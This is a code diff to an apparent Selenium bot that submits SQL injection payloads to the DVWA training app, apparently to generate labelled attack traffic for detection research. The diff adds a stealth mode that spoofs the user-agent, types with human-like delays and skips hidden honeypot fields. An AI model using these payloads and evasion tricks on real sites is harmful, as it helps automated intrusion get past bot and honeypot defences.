@@ -42,6 +42,13 @@ SECURITY_LEVEL = os.environ.get("DVWA_SECURITY_LEVEL", "low")
 SESSIONS = int(os.environ.get("ALLM_SESSIONS", "3"))
 DVWA_USER = os.environ.get("DVWA_USER", "admin")
 DVWA_PASS = os.environ.get("DVWA_PASS", "password")
+STEALTH = os.environ.get("ALLM_STEALTH", "false").strip().lower() in (
+    "1", "true", "yes",
+)
+STEALTH_UA = (
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+)
 
 PAYLOADS = [
     "1' OR '1'='1",
@@ -66,12 +73,35 @@ def _make_driver(label_headers: dict) -> webdriver.Chrome:
     opts.add_argument("--no-sandbox")
     opts.add_argument("--disable-dev-shm-usage")
     opts.add_argument("--window-size=1280,800")
+    if STEALTH:
+        opts.add_argument(f"--user-agent={STEALTH_UA}")
     service = Service(os.environ.get("CHROMEDRIVER_BIN", "/usr/bin/chromedriver"))
     driver = webdriver.Chrome(service=service, options=opts)
     # set X-Allm-* on every subsequent request via CDP
     driver.execute_cdp_cmd("Network.enable", {})
     driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": label_headers})
     return driver
+
+
+def _human_pause() -> None:
+    if STEALTH:
+        time.sleep(random.uniform(2.5, 6.5))
+
+
+def _is_visible_input(driver: webdriver.Chrome, inp) -> bool:
+    """Skip off-screen / hidden inputs in stealth mode (avoids
+    invisible_field honeypot)."""
+    try:
+        if not inp.is_displayed():
+            return False
+        rect = inp.rect
+        if rect.get("width", 0) < 5 or rect.get("height", 0) < 5:
+            return False
+        if rect.get("x", 0) < 0 or rect.get("y", 0) < 0:
+            return False
+        return True
+    except WebDriverException:
+        return False
 
 
 def _record_provenance_in_browser(driver: webdriver.Chrome, payload: dict) -> None:
@@ -113,6 +143,19 @@ def _attack_page(driver: webdriver.Chrome, path: str) -> None:
             inputs = driver.find_elements(By.CSS_SELECTOR, sel)
         except NoSuchElementException:
             continue
+        if STEALTH:
+            # one visible input, one slow keystroke pass, no fill-all
+            inputs = [i for i in inputs if _is_visible_input(driver, i)]
+            if not inputs:
+                continue
+            try:
+                inputs[0].clear()
+                for ch in payload:
+                    inputs[0].send_keys(ch)
+                    time.sleep(random.uniform(0.08, 0.18))
+            except WebDriverException:
+                pass
+            break
         for inp in inputs:
             try:
                 inp.clear()
@@ -128,14 +171,16 @@ def _attack_page(driver: webdriver.Chrome, path: str) -> None:
         time.sleep(0.2)
     except (NoSuchElementException, WebDriverException):
         pass
+    _human_pause()
 
 
 def run_session(i: int) -> int:
     payload = build_payload(
         klass="agent", family=LABEL, target_app=TARGET_APP,
-        security_level=SECURITY_LEVEL, stealth=False,
-        generator="selenium_bot", generator_version="0.1.0",
-        generator_config={"engine": "selenium", "paths": VULN_PATHS},
+        security_level=SECURITY_LEVEL, stealth=STEALTH,
+        generator="selenium_bot", generator_version="0.2.0",
+        generator_config={"engine": "selenium", "paths": VULN_PATHS,
+                          "stealth": STEALTH},
     )
     label_headers = headers_for(payload)
     driver = _make_driver(label_headers)
@@ -171,8 +216,9 @@ def run_session(i: int) -> int:
 
 
 def main() -> int:
+    mode = "stealth" if STEALTH else "fast"
     print(f"[{LABEL}] target={TARGET} target_app={TARGET_APP} "
-          f"sessions={SESSIONS}", flush=True)
+          f"mode={mode} sessions={SESSIONS}", flush=True)
     for i in range(SESSIONS):
         t0 = time.time()
         pages = run_session(i)
